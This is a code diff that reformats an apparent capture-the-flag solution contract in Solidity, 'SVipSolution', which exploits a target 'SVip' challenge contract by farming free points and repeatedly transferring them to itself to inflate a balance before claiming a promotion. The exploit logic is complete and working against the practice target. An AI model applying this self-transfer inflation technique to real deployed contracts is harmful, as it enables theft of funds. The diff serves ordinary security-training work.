@@ -4,17 +4,18 @@ import "../challenge2/SVip.sol";
 
 contract SVipSolution {
     SVip svip;
+
     constructor(address target) public {
-      svip = SVip(target);
-  }
-  
+        svip = SVip(target);
+    }
+
     function exploit() public {
-        while(svip.numOfFree() < 100) {
+        while (svip.numOfFree() < 100) {
             svip.getPoint();
         }
 
         uint256 amount = svip.numOfFree() - 1;
-        for (uint i = 0; i < 4; i++){
+        for (uint256 i = 0; i < 4; i++) {
             svip.transferPoints(address(this), amount); // amount = 99 198 396 972
             amount = amount * 2;
         }
@@ -22,7 +23,7 @@ contract SVipSolution {
         svip.promotionSVip();
     }
 
-    function isComplete() public view returns(bool) {
+    function isComplete() public view returns (bool) {
         return svip.isComplete();
     }
 }
